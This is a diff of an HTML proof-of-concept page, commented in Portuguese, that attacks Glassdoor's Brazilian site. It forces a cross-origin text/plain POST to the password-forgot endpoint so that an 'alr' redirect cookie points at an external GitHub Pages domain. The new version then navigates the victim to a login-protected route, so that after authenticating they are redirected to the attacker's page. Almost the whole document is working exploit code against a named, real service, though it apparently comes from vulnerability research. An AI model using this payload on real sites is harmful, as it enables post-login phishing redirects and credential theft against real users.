@@ -1,34 +1,15 @@
 <!doctype html>
 <meta charset="utf-8">
-<title>Glassdoor Redirect PoC – discover alr consumer</title>
+<title>Glassdoor Redirect PoC – alr consumer</title>
 <body>
-<h2>PoC – Open Redirect via cookie <code>alr</code> (detector de consumo)</h2>
-<p>1) Esta página (origem externa: GitHub Pages) envia um <b>POST sem preflight</b> para
-<code>/auth/account/password/forgot/initiate</code>, fazendo o Glassdoor definir
-<code>alr =&lt;esta URL&gt;</code>.<br>
-2) Depois, use os botões para navegar por rotas comuns. Se alguma consumir o <code>alr</code>, você será
-redirecionado de volta para este domínio (prova do open redirect pós-auth).</p>
-
+<h2>PoC – Open Redirect via cookie <code>alr</code> (forçando rota protegida)</h2>
 <pre id="log" style="background:#111;color:#eee;padding:10px;white-space:pre-wrap"></pre>
-
-<div id="actions" style="display:none;margin:10px 0;">
-  <p><b>Navegar para testar consumo do <code>alr</code>:</b></p>
-  <button onclick="go('/')">/</button>
-  <button onclick="go('/index.htm')">/index.htm</button>
-  <button onclick="go('/Job/index.htm')">/Job/index.htm</button>
-  <button onclick="go('/member/profile')">/member/profile</button>
-  <button onclick="go('/member/home')">/member/home</button>
-  <button onclick="go('/member/account/settings')">/member/account/settings</button>
-  <button onclick="go('/auth/account/password/forgot/complete')">/auth/account/password/forgot/complete</button>
-  <button onclick="go('/auth/complete')">/auth/complete</button>
-  <button onclick="go('/auth/logout')">/auth/logout (depois faça login de novo)</button>
-</div>
 
 <script>
 (function () {
   const log = (m)=>{document.getElementById('log').textContent += m + "\n"};
 
-  // 1) cria iframe receptor e form text/plain (sem preflight)
+  // 1) cria iframe “sink” e form text/plain (sem preflight) para setar alr=referer
   const iframe = document.createElement('iframe');
   iframe.name = 'sink';
   iframe.style.display = 'none';
@@ -46,25 +27,21 @@ redirecionado de volta para este domínio (prova do open redirect pós-auth).</p
   form.appendChild(ta);
   document.body.appendChild(form);
 
-  log("[1/2] Enviando POST para setar cookie alr com Referer desta página…");
+  log("[1/3] Enviando POST para setar cookie alr com o Referer desta página…");
   try { form.submit(); } catch(e){ log("Falha ao enviar form: " + e.message); }
 
-  // 2) habilita botões de navegação depois de pequeno atraso
+  // 2) pequeno delay para Set-Cookie chegar
   setTimeout(function(){
-    log("[2/2] Cookie possivelmente setado. Agora clique nos botões abaixo e veja se alguma rota consome o alr.");
-    document.getElementById('actions').style.display = 'block';
+    log("[2/3] Verifique em Application → Cookies → https://www.glassdoor.com.br se 'alr' aponta para este domínio.");
+    // 3) agora força navegação para rota PROTEGIDA que pede login
+    const protectedPath = "/member/profile"; // tente /member/account/settings se preferir
+    log("[3/3] Navegando para rota protegida: " + protectedPath);
+    window.location.href = "https://www.glassdoor.com.br" + protectedPath;
   }, 1200);
 })();
-
-function go(path){
-  document.getElementById('log').textContent += "→ navegando para https://www.glassdoor.com.br" + path + "\n";
-  window.location.href = "https://www.glassdoor.com.br" + path;
-}
 </script>
 
 <p style="font-size:12px;color:#666;margin-top:16px">
-Dica: abra em janela anônima. Antes de navegar, confira em
-<b>Application → Cookies → https://www.glassdoor.com.br</b> que <code>alr</code> aponta para este GitHub Pages.
-Depois clique nos botões em sequência; quando alguma rota consumir o <code>alr</code>, você voltará para este domínio.
+Fluxo esperado: esta página seta <code>alr</code> → você é levado a <code>/member/profile</code> (que exige login) → após autenticar, o site consome o <code>alr</code> e redireciona você de volta para este domínio (GitHub Pages).
 </p>
 </body>
